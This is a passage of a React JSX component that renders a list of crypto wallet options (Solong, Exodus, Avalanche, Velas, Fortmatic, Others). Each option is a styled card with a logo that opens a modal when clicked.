              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Solong</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={solong}
                alt="Solana"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Exodus')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Exodus</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={exodus}
                alt="Exosud"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Avalanche')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Avalanche</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={avalanche}
                alt="avalanche"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Velas')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Velas</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={velas}
                alt="Velas"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Fortmatic')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Fortmatic</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={fortmatic}
                alt="Velas"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>


          <div onClick={() => this.showModalFunc('Others')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Others</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={others}
                alt="Others"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>



        </div>
        </div>
    </div>
    </Aux>



  )

 }

}